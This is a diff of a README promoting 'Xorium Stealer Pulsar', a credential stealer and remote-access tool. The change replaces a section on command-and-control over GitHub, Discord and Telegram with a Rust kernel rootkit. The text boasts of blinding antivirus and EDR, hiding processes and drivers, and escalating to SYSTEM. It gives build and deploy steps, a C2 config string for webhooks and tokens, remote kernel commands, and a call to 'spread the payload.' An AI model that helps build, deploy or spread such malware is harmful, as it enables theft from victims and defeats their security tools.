@@ -32,10 +32,12 @@ Why run as a user when you can run as **GOD**?
 - **Auto-Escalate**: User -> `NT AUTHORITY\SYSTEM` in milliseconds.
 - **Command Dominance**: Execute any command with the highest privileges available on Windows.
 
-### 3. 🕸️ DYSTOPIA C2 (Unbannable Infra)
-Forget buying servers. Forget Tor. Xorium turns legitimate platforms into your C2.
-- **GitHub RAT**: Uses Public/Private Repos as a C2.
-- **Discord & Telegram**: Classic, reliable, blazing fast webhooks.
+### 3. 🌑 VOID WALKER (Ring 0 Kernel Rootkit)
+The ultimate weapon for absolute OS control. Xorium now integrates a **Rust-based Kernel Rootkit**.
+- **DKOM (Direct Kernel Object Manipulation)**: Manipulates `EPROCESS` structures to hide any process from Task Manager, ProcExp, and the kernel itself.
+- **Callback Neutralization**: Strips `PsSetCreateProcessNotifyRoutine` and other security callbacks to blind EDRs/AVs.
+- **Port/Driver Hiding**: Conceals network connections and loaded drivers at the ring 0 level.
+- **Xorium Bridge**: The loader can now command the kernel directly using original Rust client tools.
 
 ---
 
@@ -44,48 +46,48 @@ Forget buying servers. Forget Tor. Xorium turns legitimate platforms into your C
 | Feature | ❌ Garbage Stealer | ✅ XORIUM PULSAR |
 | :--- | :---: | :---: |
 | **Language** | Python/C# (Detected) | **Rust + C# Hybrid** |
-| **Stealth** | None | **AMSI/ETW Patching + PEB Unlinking** |
-| **Privilege** | User | **SYSTEM (GodPotato)** |
-| **Bypass** | Disable Defender (Flagged) | **Whitelist Injection** |
+| **Stealth** | None | **Ring 0 Kernel + Ring 3 Evasion** |
+| **Concealment** | Task Manager Visible | **Fully Hidden via DKOM** |
+| **Privilege** | User | **NT AUTHORITY\SYSTEM** |
 | **C2** | Webhook Only | **GitHub / Discord / Tele** |
-| **Price** | $50/month | **FREE / OPEN SOURCE** |
 
 ---
 
 ## 🚀 HOW TO DEPLOY (Start Your Empire)
 
-### Step 1: Forge the Shadow Core (Rust)
-You need the **Visual Studio C++ Build Tools** installed.
+### Step 1: Forge the Kernel & Client (Rust)
 1.  Navigate to `shadow-main`:
     ```cmd
     cd shadow-main
     ```
-2.  Compile the stealth module:
+2.  Compile the Kernel Driver and Client:
     ```cmd
     cargo build --release
     ```
-3.  This generates `shadow_core.dll` in `target/release/`. This is your invisible rootkit.
+3.  This generates:
+    - `shadow.sys`: The Kernel Driver.
+    - `shadow-client.exe`: The Command Bridge used by Xorium.
 
 ### Step 2: Build the Loader (C#)
-1.  Open `Xorium Stealer Pulsar.sln` in Visual Studio.
-2.  Build the `Stub` project (Release Mode).
-3.  **Merge**: Place `shadow_core.dll` next to your specific Loader executable, or use ILMerge to bundle them if configured.
+1.  Open Project in Visual Studio.
+2.  Ensure `shadow-client.exe` is in the output directory.
+3.  Build the project. The loader will automatically interface with the Rust bridge.
 
-### Step 3: Configure & Spread
-Xorium Config String:
-`DiscordWebhook|TelegramToken|ChatID|GitHubToken|GitHubRepo`
+---
 
-spread the payload. Watch the logs flood in.
+## 🎮 REMOTE KERNEL COMMANDS
+Xorium can now execute these commands via its C2:
+- `kernel_hide` [PID]: Vanish from all system views.
+- `kernel_elevate` [PID]: Token stealing for instant SYSTEM.
+- `kernel_protect` [PID]: Make a process unkillable even by Admin.
+- `kernel_hide_driver` [NAME]: Hide the rootkit driver itself.
 
 ---
 
 ## 🔮 FUTURE WARFARE (Roadmap)
-
-We are not stopping here.
-- [ ] **Ring 0 Rootkit**: True Kernel Driver for absolute OS control.
+- [x] **Ring 0 Rootkit**: Absolute OS control via Rust Kernel Driver.
 - [ ] **HVCI Bypass**: Hypervisor-protected Code Integrity bypass.
 - [ ] **UEFI Bootkit**: Persistence that survives OS reinstallation.
-- [ ] **Linux/MacOS Variants**: Expanding the empire.
 
 ---
 
